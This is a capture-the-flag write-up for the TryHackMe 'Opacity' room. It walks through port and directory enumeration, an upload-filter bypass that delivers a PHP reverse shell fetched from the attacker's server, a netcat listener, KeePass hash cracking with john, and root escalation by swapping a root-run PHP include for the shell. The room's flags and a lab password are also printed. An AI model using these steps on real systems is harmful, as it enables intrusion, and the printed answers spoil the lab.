## Opacity - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/opacity)

Opacity is an easy machine that can help you in the penetration testing learning process.

There are 2 hash keys located on the machine (user - local.txt and root - proof.txt). Can you find them and become root?

Hint: There are several ways to perform an action; always analyze the behavior of the application.

**IP: 10.10.89.16**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web <br>

**Tools Used**: Nmap, Gobuster, John<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting with Nmap scan and Gobuster fuzzing.

  ```
  nmap -sC -sV 10.10.89.16

  PORT    STATE SERVICE     VERSION
  22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 e3:12:d7:0c:ca:f8:de:27:5a:38:2d:34:b7:53:ee:dd (RSA)
  |   256 6e:78:68:31:27:2a:64:bd:5c:ac:55:f9:4d:a0:59:1a (ECDSA)
  |_  256 a3:6b:59:6a:f8:3d:0d:06:b2:e8:e3:a8:71:c1:fd:de (ED25519)
  80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
  | http-cookie-flags: 
  |   /: 
  |     PHPSESSID: 
  |_      httponly flag not set
  | http-title: Login
  |_Requested resource was login.php
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  139/tcp open  netbios-ssn Samba smbd 4
  445/tcp open  netbios-ssn Samba smbd 4
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  
  Host script results:
  |_nbstat: NetBIOS name: IP-10-10-223-95, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
  |_clock-skew: 1s
  | smb2-time: 
  |   date: 2025-06-01T19:25:13
  |_  start_date: N/A
  | smb2-security-mode: 
  |   3:1:1: 
  |_    Message signing enabled but not required
  ```

  ```
  gobuster dir -u http://10.10.89.16/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /css                  (Status: 301) [Size: 308] [--> http://10.10.89.16/css/]
  /cloud                (Status: 301) [Size: 310] [--> http://10.10.89.16/cloud/]
  Progress: 87664 / 87665 (100.00%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- When you visit `/cloud`, you will have a option to upload an image.

---

## ⚙️ Shell Access

- Make a classic PHP reverse shell, start a listener and upload a shell as `shell.php#.png`. You need to run a Python server as well.

  ```
  http://[YOUR-THM-IP]:80/shell.php#.png

  python3 -m http.server 80
  Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
  10.10.89.16 - - [03/Jun/2025 20:57:35] "GET /shell.php HTTP/1.1" 200 -
  ^C
  Keyboard interrupt received, exiting.

  nc -lvnp 4444
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.89.16] 33134
  Linux ip-10-10-89-16 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
   20:03:08 up 26 min,  0 users,  load average: 0.00, 0.00, 0.05
  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /bin/sh: 0: can't access tty; job control turned off
  $ whoami
  www-data
  $ id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```
  
- Change it to Putty shell and let's get those flags.

---

## 🧍 User Privilege Escalation

- I found the first flag but couldn't read it.

  ```
  www-data@ip-10-10-89-16:/home/sysadmin$ cat local.txt 
  cat: local.txt: Permission denied
  ```
  
- After enumerating for a bit, I found a `.kdbx` file.

  ```
  www-data@ip-10-10-89-16:/home/sysadmin$ find / -type f -user sysadmin 2>/dev/null 
  /opt/dataset.kdbx
  /home/sysadmin/.sudo_as_admin_successful
  /home/sysadmin/.bash_history
  /home/sysadmin/local.txt
  /home/sysadmin/.bashrc
  /home/sysadmin/.bash_logout
  /home/sysadmin/.profile
  ```

  ```
  wget http://10.10.89.16:1234/dataset.kdbx
  --2025-06-03 21:19:13--  http://10.10.89.16:1234/dataset.kdbx
  Connecting to 10.10.89.16:1234... connected.
  HTTP request sent, awaiting response... 200 OK
  Length: 1566 (1.5K) [application/octet-stream]
  Saving to: ‘dataset.kdbx’
  
  dataset.kdbx                  100%[==============================================>]   1.53K  --.-KB/s    in 0s 
  ```
  
- This is a KeePass file. You can get the password with John and open the file with `https://app.keeweb.info/` to get the actual credentials.

  ```
  file dataset.kdbx 
  dataset.kdbx: Keepass password database 2.x KDBX
  
  keepass2john dataset.kdbx > keepass.txt
  
  john --wordlist=/rockyou.txt keepass.txt 
  
  Using default input encoding: UTF-8
  Loaded 1 password hash (KeePass [SHA256 AES 32/64])
  Cost 1 (iteration count) is 100000 for all loaded hashes
  Cost 2 (version) is 2 for all loaded hashes
  Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
  Will run 2 OpenMP threads
  Press 'q' or Ctrl-C to abort, almost any other key for status
  741852963        (dataset)     
  1g 0:00:00:10 DONE (2025-06-03 21:23) 0.09259g/s 80.74p/s 80.74c/s 80.74C/s chichi..walter
  Use the "--show" option to display all of the cracked passwords reliably
  Session completed.

  https://app.keeweb.info/

  open the .kdbx file and put password
  
  sysadmin
  Cl0udP4ss40p4city#8700 
  ```

- Now login with SSH and read the flag.

  ```
  ssh sysadmin@10.10.89.16
  sysadmin@10.10.89.16's password: 
  Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)
  [SNIP!]
  Last login: Wed Feb 22 08:13:43 2023 from 10.0.2.15
  sysadmin@ip-10-10-89-16:~$ whoami
  sysadmin
  sysadmin@ip-10-10-89-16:~$ id
  uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin),24(cdrom),30(dip),46(plugdev)
  
  sysadmin@ip-10-10-89-16:~$ cat /home/sysadmin/local.txt 
  6661b61b44d234d230d06bf5b3c075e2
  ```

---

## 👑 Root Privilege Escalation

- When it comes to root flag, there is a PHP script in the `sysadmin` directory that will get us to root.

  ```
  sysadmin@ip-10-10-89-16:~$ cd scripts/
  sysadmin@ip-10-10-89-16:~/scripts$ ls -al
  total 16
  drwxr-xr-x 3 root     root     4096 Jul  8  2022 .
  drwxr-xr-x 6 sysadmin sysadmin 4096 Feb 22  2023 ..
  drwxr-xr-x 2 sysadmin root     4096 Jul 26  2022 lib
  -rw-r----- 1 root     sysadmin  519 Jul  8  2022 script.php
  sysadmin@ip-10-10-89-16:~/scripts$ cat script.php 
  <?php
  
  //Backup of scripts sysadmin folder
  require_once('lib/backup.inc.php');
  zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
  echo 'Successful', PHP_EOL;
  
  //Files scheduled removal
  $dir = "/var/www/html/cloud/images";
  if(file_exists($dir)){
      $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
      $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
      foreach ( $ri as $file ) {
          $file->isDir() ?  rmdir($file) : unlink($file);
      }
  }
  ?>
  ```
  
- `backup.inc.php` is owned by root so we are not allowed to change its contents. However, as user sysadmin, we have execution rights on the lib directory. 
  This allows us to remove `backup.inc.php` and add another file with the same name, but with a different content. We will add a script that spawns a terminal. 
  Since `script.php` includes `backup.inc.php` and runs with root privileges, it will ultimately spawn a root terminal.

  ```
  sysadmin@ip-10-10-89-16:~/scripts/lib$ ls -al
  total 132
  drwxr-xr-x 2 sysadmin root  4096 Jul 26  2022 .
  drwxr-xr-x 3 root     root  4096 Jul  8  2022 ..
  -rw-r--r-- 1 root     root  9458 Jul 26  2022 application.php
  -rw-r--r-- 1 root     root   967 Jul  6  2022 backup.inc.php
  -rw-r--r-- 1 root     root 24514 Jul 26  2022 bio2rdfapi.php
  -rw-r--r-- 1 root     root 11222 Jul 26  2022 biopax2bio2rdf.php
  -rw-r--r-- 1 root     root  7595 Jul 26  2022 dataresource.php
  -rw-r--r-- 1 root     root  4828 Jul 26  2022 dataset.php
  -rw-r--r-- 1 root     root  3243 Jul 26  2022 fileapi.php
  -rw-r--r-- 1 root     root  1325 Jul 26  2022 owlapi.php
  -rw-r--r-- 1 root     root  1465 Jul 26  2022 phplib.php
  -rw-r--r-- 1 root     root 10548 Jul 26  2022 rdfapi.php
  -rw-r--r-- 1 root     root 16469 Jul 26  2022 registry.php
  -rw-r--r-- 1 root     root  6862 Jul 26  2022 utils.php
  -rwxr-xr-x 1 root     root  3921 Jul 26  2022 xmlapi.php

  sysadmin@ip-10-10-89-16:~/scripts/lib$ rm -rf backup.inc.php

  sysadmin@ip-10-10-89-16:~/scripts/lib$ ls -al
  total 128
  drwxr-xr-x 2 sysadmin root  4096 Jun  3 20:42 .
  drwxr-xr-x 3 root     root  4096 Jul  8  2022 ..
  -rw-r--r-- 1 root     root  9458 Jul 26  2022 application.php
  -rw-r--r-- 1 root     root 24514 Jul 26  2022 bio2rdfapi.php
  -rw-r--r-- 1 root     root 11222 Jul 26  2022 biopax2bio2rdf.php
  -rw-r--r-- 1 root     root  7595 Jul 26  2022 dataresource.php
  -rw-r--r-- 1 root     root  4828 Jul 26  2022 dataset.php
  -rw-r--r-- 1 root     root  3243 Jul 26  2022 fileapi.php
  -rw-r--r-- 1 root     root  1325 Jul 26  2022 owlapi.php
  -rw-r--r-- 1 root     root  1465 Jul 26  2022 phplib.php
  -rw-r--r-- 1 root     root 10548 Jul 26  2022 rdfapi.php
  -rw-r--r-- 1 root     root 16469 Jul 26  2022 registry.php
  -rw-r--r-- 1 root     root  6862 Jul 26  2022 utils.php
  -rwxr-xr-x 1 root     root  3921 Jul 26  2022 xmlapi.php
  ```
  
- Now upload the same shell you uploaded to `/cloud` in order to get initial access.

  ```
  sysadmin@ip-10-10-89-16:~/scripts/lib$ wget http://[YOUR-THM-IP]:80/shell.php -O backup.inc.php
  --2025-06-03 20:43:06--  http://[YOUR-THM-IP]/shell.php
  Connecting to [YOUR-THM-IP]:80... connected.
  HTTP request sent, awaiting response... 200 OK
  Length: 5493 (5.4K) [application/octet-stream]
  Saving to: ‘backup.inc.php’
  
  backup.inc.php                100%[==============================================>]   5.36K  --.-KB/s    in 0s      
  
  2025-06-03 20:43:06 (545 MB/s) - ‘backup.inc.php’ saved [5493/5493]

  nc -lvnp 4444
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.89.16] 54364
  Linux ip-10-10-89-16 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
   20:44:01 up  1:07,  1 user,  load average: 0.00, 0.00, 0.00
  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
  sysadmin pts/0    10.8.120.52      20:34   57.00s  0.06s  0.06s -bash
  uid=0(root) gid=0(root) groups=0(root)
  /bin/sh: 0: can't access tty; job control turned off
  # whoami
  root
  ```

- Read the flag and byebye!

---

## 🏁 Flags

- **local.txt**: `6661b61b44d234d230d06bf5b3c075e2`
- **proof.txt**: `ac0d56f93202dd57dcb2498c739fd20e`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Nothing much.`

- What did I learn?
  `New shell upload technique and KeePass cracking.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
